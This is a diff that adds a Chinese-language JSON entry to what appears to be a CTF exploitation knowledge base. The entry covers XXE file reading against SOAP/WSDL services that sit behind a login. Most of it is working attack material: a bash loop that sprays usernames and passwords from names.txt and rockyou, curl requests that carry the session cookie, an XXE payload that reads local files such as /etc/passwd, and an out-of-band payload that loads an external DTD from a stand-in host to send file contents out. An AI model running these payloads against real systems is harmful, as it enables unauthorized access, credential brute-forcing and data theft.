@@ -1,0 +1,74 @@
+{
+  "id": "web-soap-wsdl-xxe",
+  "title": "SOAP/WSDL 服务 XXE 文件读(+ 前置默认口令登录)",
+  "vuln_pattern": "后端用 lxml/etree 等解析用户可控 XML(SOAP 请求体),且未禁用外部实体(resolve_entities=True / 无 defusedxml)——DOCTYPE 声明外部实体读本地文件,值经某个被回显的字段带出;SOAP 端点常挂在登录后,需先用默认口令认证",
+  "fingerprint": [
+    "soap",
+    "wsdl",
+    "/wsdl",
+    "soap service",
+    "soapaction",
+    "soap:address",
+    "xml service",
+    "text/xml",
+    "application/xml",
+    "lxml",
+    "etree",
+    "resolve_entities",
+    "xxe",
+    "xml external entity",
+    "external entity",
+    "<!ENTITY",
+    "<!DOCTYPE",
+    "file://",
+    "外部实体",
+    "实体注入",
+    "xml解析",
+    "xml 解析"
+  ],
+  "exploit_steps": [
+    "识别 SOAP/XML 面:题面/题名含 SOAP、存在 /wsdl(或任何返回 XML 的端点)、请求走 text/xml 或 application/xml、后端用 lxml/etree。别把它当诱饵——题名/tag 指向 SOAP 时它常就是主漏洞。",
+    "找真实服务端点:GET /wsdl 抽 `<soap:address location=\"...\">` 里的路径(就是打点的 URL)。WSDL 可能因部署 bug 返回空/报错——拿不到不代表没服务,直接枚举常见端点名:/soap /service /services /api/soap /ws /soap/api /xmlrpc /<服务名>_service。",
+    "先认证再打(关键):SOAP 端点常带 @login_required,未登录测 XXE 只会吃 302/401,会误判其'inert'。认证优先试默认口令,且【用户名不能只手打 admin——admin 常不在用户表】:直接拿镜像自带【人名/用户名字典】喷(/usr/share/dirb/wordlists/others/names.txt、SecLists 的 top-usernames 等),口令用 rockyou top-N 或默认弱口令族(产品默认/键盘序),用 /opt/tools/authspray.py 或脚本循环 username×password。用户名线索若可得(WSDL/响应/题面里的人名或 email 前缀,如响应出现某人名/xxx@ -> 用户名 xxx)就先用它,拿不到就【喷字典】而不是只试几个手打名。",
+    "带 session 先发一个【合法】SOAP 请求,确认服务解析 XML 并把某个输入字段【原样回显】(如 id/account/name)——这个回显字段就是 XXE 的外带信道。",
+    "XXE 读文件:在合法请求前加 DOCTYPE 外部实体,把回显字段的值换成实体引用。目标文件按题目要求(常见 flag 落点:/app/flag.txt、/flag、/flag.txt、/etc/passwd 验证读权限)。",
+    "无回显时:①报错型——实体指向不存在/受限文件,异常信息常把已读内容或路径带出(题目 except 里 return str(e) 很常见);②OOB 盲读——参数实体加载外部 DTD 回连 `<token>.<OOB域>` 外带 base64 文件内容。"
+  ],
+  "key_payloads": [
+    "curl -s http://<T>/wsdl | grep -oE 'soap:address location=\"[^\"]+\"'   # 抽真实服务端点",
+    "# 默认口令登录(用户名池,别只试 admin;拿 cookie 供后续带 session):",
+    "# 用户名喷字典(别只手打 admin;names 字典含大量常见人名),口令用 rockyou top-N 或默认族:",
+    "for u in $(head -300 /usr/share/dirb/wordlists/others/names.txt); do for p in $(head -40 /usr/share/wordlists/rockyou.txt); do r=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://<T>/login --data \"username=$u&password=$p\"); [ \"$r\" = 302 ] && echo \"HIT $u:$p\" && break; done; done   # 或 /opt/tools/authspray.py http",
+    "curl -s -c jar -X POST http://<T>/login --data 'username=<喷中的用户名>&password=<喷中的口令>'   # 登录成功(302)后拿 cookie",
+    "# 合法 SOAP 请求探回显字段(确认哪个输入被原样回显):",
+    "curl -s -b jar -X POST http://<T>/<soap端点> -H 'Content-Type: application/xml' --data '<GetXxxRequest><id>PROBE123</id></GetXxxRequest>'   # 看响应是否回显 PROBE123",
+    "# XXE 读文件(把回显字段值换成实体引用):",
+    "curl -s -b jar -X POST http://<T>/<soap端点> -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///<目标文件>\">]><GetXxxRequest><id>&x;</id></GetXxxRequest>'",
+    "# OOB 盲读(无回显):参数实体 + 外部 DTD 外带",
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///<目标文件>\"><!ENTITY % dtd SYSTEM \"http://<OOB>/e.dtd\">%dtd;]><r>&send;</r>"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "xxe",
+    "soap",
+    "wsdl",
+    "default-credentials",
+    "file-read"
+  ],
+  "source": "seed: SOAP/WSDL XXE + default-credential methodology",
+  "created_ts": 0.0,
+  "preconditions": [
+    "后端解析用户可控 XML(SOAP/REST-XML/上传的 XML/SVG/docx 内的 XML),且未用 defusedxml、未禁 DTD/外部实体"
+  ],
+  "verify_oracle": "回显字段里出现目标文件内容(如 flag 串/passwd 行)、或 OOB 监听收到外带的文件内容、或错误回显带出文件内容——三者之一即确认 XXE 成立",
+  "pitfalls": [
+    "SOAP 端点常被 login_required 挡:未登录测 XXE 全 302/401,先用默认口令登录再打——未登录态测 SOAP 端点会被误判为 inert 而错过整条链",
+    "别被显眼的干扰功能带偏:一道 XXE 题若同时开着花哨功能(Werkzeug 调试台/管理面板),题名/tag 指向 SOAP 就【优先打 SOAP】:显眼的调试台/管理面板常是干扰项,XXE 才是正解",
+    "WSDL 端点可能因部署 bug 返回空(如函数名遮蔽 wsdl 变量)——拿不到 WSDL ≠ 没 SOAP 服务,直接枚举常见端点名",
+    "默认口令别只手打几个 admin/user:真凭据常是某个普通人名(admin 往往根本不在用户表)——拿人名字典(names.txt)喷才是正解,手打三五个名字几乎必然错过;有线索(WSDL/响应/题面人名/email)就先用线索名",
+    "lxml XXE 成立条件看解析器:显式 `etree.XMLParser(resolve_entities=True)` 或老版默认解析时成立;用 defusedxml 或 `resolve_entities=False`/`no_network=True` 则不成立,别在被防护的解析器上死磕",
+    "回显型先发合法请求锁定'哪个字段被原样回显',再把实体塞进那个字段——塞错字段读到文件也带不出来"
+  ]
+}
